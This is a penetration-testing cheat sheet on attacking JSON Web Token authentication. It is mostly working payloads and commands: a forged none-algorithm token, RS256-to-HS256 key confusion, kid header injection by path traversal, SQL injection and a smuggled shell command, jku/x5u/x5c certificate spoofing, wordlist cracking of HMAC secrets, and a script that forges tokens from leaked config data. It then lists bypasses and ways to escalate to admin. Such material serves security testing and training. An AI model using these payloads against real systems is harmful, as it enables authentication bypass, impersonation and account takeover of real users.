# JWT (JSON Web Tokens)

> **Summary**: JWT vulnerabilities arise from insecure token generation, weak signing secrets, or flawed signature verification, allowing attackers to forge or tamper with authentication tokens.
> **Impact**: Authentication bypass, privilege escalation, account takeover, impersonation of any user including admin.
> **Typical Severity**: High | Critical

## Detection

### Indicators
- `Authorization: Bearer eyJhbG...` header in HTTP requests
- Cookies containing base64-encoded dot-separated values (three segments: `header.payload.signature`)
- Tokens stored in `localStorage` or `sessionStorage` (inspect via browser DevTools)
- API responses returning tokens after login/authentication endpoints
- Three-part base64url structure: `eyJ` prefix is a strong indicator (base64 for `{"`)

### Automated Detection
```bash
# Run jwt_tool in scan-all mode against an endpoint
python3 jwt_tool.py -M at \
    -t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
    -rh "Authorization: Bearer eyJhbG...<JWT Token>"
```

Use the **Burp Extension SignSaboteur** or **JSON Web Tokens** extension to detect and manipulate JWTs in Burp Suite.

### Manual Detection
1. Decode the token at [jwt.io](https://jwt.io) or with `jwt_tool.py <token>`
2. Identify the algorithm in the header (`alg` field): HS256, RS256, ES256, none, etc.
3. Check if the token originates client-side or server-side (inspect proxy history)
4. Check token expiration: does the `exp` claim exist? Is it enforced?
5. Tamper with the payload (change `sub`, `role`, `admin`) without modifying the signature -- if the server accepts it, signature verification is broken

## Exploitation

### Prerequisites
- A valid JWT token (captured from login, cookie, or API response)
- Knowledge of the algorithm used (`alg` header claim)
- For algorithm confusion: the server's public key (retrievable from TLS certificate or JWKS endpoint)

### Step-by-Step
1. **Decode** the JWT: separate header, payload, and signature
2. **Identify the algorithm**: check `alg` field (HS256, RS256, ES256, none)
3. **Test None algorithm**: set `alg` to `None`/`none`/`NONE`/`nOnE` and remove the signature
4. **Test algorithm confusion**: if RS256, switch to HS256 and sign with the public key
5. **Brute-force the secret**: if HS256, use hashcat or jwt-cracker against known wordlists
6. **Test kid injection**: if `kid` header exists, try directory traversal, SQLi, or command injection
7. **Test jku/x5u spoofing**: if present, redirect to attacker-controlled JWKS/certificate
8. **Test x5c embedding**: embed a self-signed certificate in the header
9. **Tamper with claims**: modify `sub`, `role`, `admin`, `email`, `iss` claims and re-sign

### Payloads

#### None Algorithm Attack
Set the header algorithm to `None` and remove the signature (keep the trailing dot):
```
# Original header
{"typ":"JWT","alg":"HS256"}

# Modified header
{"typ":"JWT","alg":"none"}

# Base64 of none header
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0

# Final token structure (empty signature)
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.
```

Try algorithm casing variations: `none`, `None`, `NONE`, `nOnE`

#### Algorithm Confusion (RS256 to HS256)
```bash
# 1. Retrieve the server's public key from TLS certificate
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem

# 2. Use jwt_tool to sign with the public key as HMAC secret
python3 jwt_tool.py <JWT> -X k -pk pubkey.pem

# 3. Or manually: change header alg from RS256 to HS256, then sign using the public key as the HMAC secret
```

#### kid Header Injection -- Directory Traversal
```bash
# Sign with empty string using /dev/null as the key file
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# Use a file with predictable content (Linux randomize_va_space = "2")
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
```

#### kid Header Injection -- SQL Injection
```json
{
  "kid": "non-existent-index' UNION SELECT 'ATTACKER';-- -",
  "alg": "HS256"
}
```
Then sign the token with `ATTACKER` as the secret key.

#### kid Header Injection -- OS Command Injection
```json
{
  "kid": "/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&",
  "alg": "HS256"
}
```

#### jku Header Spoofing
```bash
# 1. Generate a new key pair
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key

# 2. Host a JWKS file on attacker server containing the new public key
# 3. Set the jku header to point to attacker JWKS URL
# 4. Sign the token with the new private key

# Using jwt_tool
python3 jwt_tool.py <JWT> -X s
```

#### x5u Header Spoofing
```bash
# 1. Create a self-signed certificate
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem

# 2. Host attacker.crt on your server
# 3. Modify the x5u header to point to your certificate URL
# 4. Sign the token with the new private key
```

#### x5c Embedded Certificate
```bash
# Generate a self-signed certificate and embed it in the x5c header
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -in attacker.crt -text
# Base64-encode the certificate and place it in the x5c array
# Modify n, e, and x5t parameters accordingly
# Sign with the attacker private key
```

#### Embedded Public Key (CVE-2018-0114)
```bash
# Generate a new key pair and embed the public key in the JWT header
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
# Place the new public key parameters (n, e) into the JWT header
# Sign with the new private key using jwt.io
```

### Proof of Concept

#### Brute-Force HMAC Secret
```bash
# Using hashcat (mode 16500)
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Using jwt-cracker
jwt-cracker -t <JWT_TOKEN> -w /usr/share/wordlists/rockyou.txt

# Using jwt_tool
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
```

#### Derive JWT Secret from Leaked Config
If an arbitrary file read leaks app config and user data:
```python
from hashlib import sha256
from base64 import b64encode
import jwt

# 1. Obtain encryption_key from config leak
# 2. Obtain email, password_hash, user_id from DB leak
jwt_secret = sha256(encryption_key[::2].encode()).hexdigest()
jwt_hash = b64encode(sha256(f"{email}:{password_hash}".encode()).digest()).decode()[:10]
token = jwt.encode({"id": user_id, "hash": jwt_hash}, jwt_secret, "HS256")
```

## Bypasses
- **Signature not checked**: tamper payload, keep original signature -- server may not verify at all
- **Algorithm casing**: try `none`, `None`, `NONE`, `nOnE` for the none attack
- **Trailing whitespace/newlines**: some parsers accept `"alg": "none "` with trailing spaces
- **Empty signature with dot**: ensure token ends with `.` when using none algorithm
- **jwk claim embedding**: embed attacker-controlled JWK directly in the header
- **Cross-service relay**: token generated for one service may be accepted by another service using the same JWT provider
- **Expired token acceptance**: server may not enforce the `exp` claim
- **JTI collision**: if JTI max length is short (e.g., 4 digits), replay by wrapping (request 0001 and 10001 use same ID)
- **ES256 nonce reuse**: if the same nonce is used to sign two tokens, the private key can be recovered

## Escalation
- Forge admin tokens: set `"role": "admin"` or `"sub": "admin"` in the payload and re-sign
- Chain with **SSRF** via jku/x5u header pointing to internal services
- Chain with **SQL Injection** or **Command Injection** via the kid parameter
- Account takeover: impersonate any user by forging their JWT
- Mass impersonation if secrets are weak or leaked from config files

## Tools

| Tool | Usage |
|------|-------|
| [jwt_tool](https://github.com/ticarpi/jwt_tool) | Swiss army knife for JWT testing: scan all attacks, tamper claims, brute-force |
| [jwt.io](https://jwt.io) | Online JWT decoder/encoder, useful for manual inspection and re-signing |
| [jwt-cracker](https://github.com/lmammino/jwt-cracker) | Brute-force HS256 JWT secrets |
| [hashcat](https://hashcat.net/hashcat/) | GPU-based JWT secret cracking with mode 16500 |
| [jwt-pwn](https://github.com/mazen160/jwt-pwn) | JWT security testing toolkit |
| [SignSaboteur](https://github.com/d0ge/sign-saboteur) | Burp Suite extension for JWT attacks |
| JSON Web Tokens (Burp Extension) | Burp extension for decoding/tampering JWTs and testing CVE-2018-0114 |

## References
- [jwt_tool Attack Methodology Wiki](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)
- [PortSwigger JWT Labs](https://portswigger.net/web-security/jwt)
- [Auth0 JWT Handbook](https://auth0.com/resources/ebooks/jwt-handbook)
- [RFC 7519 - JSON Web Token](https://tools.ietf.org/html/rfc7519)
- [CVE-2016-5431 / CVE-2016-10555 - Algorithm Confusion](https://nvd.nist.gov/vuln/detail/CVE-2016-10555)
- [CVE-2018-0114 - Embedded Public Key](https://nvd.nist.gov/vuln/detail/CVE-2018-0114)
- [IANA JWT Claims Registry](https://www.iana.org/assignments/jwt/jwt.xhtml#claims)
- [ECDSA Nonce Reuse Private Key Recovery](https://asecuritysite.com/encryption/ecd5)
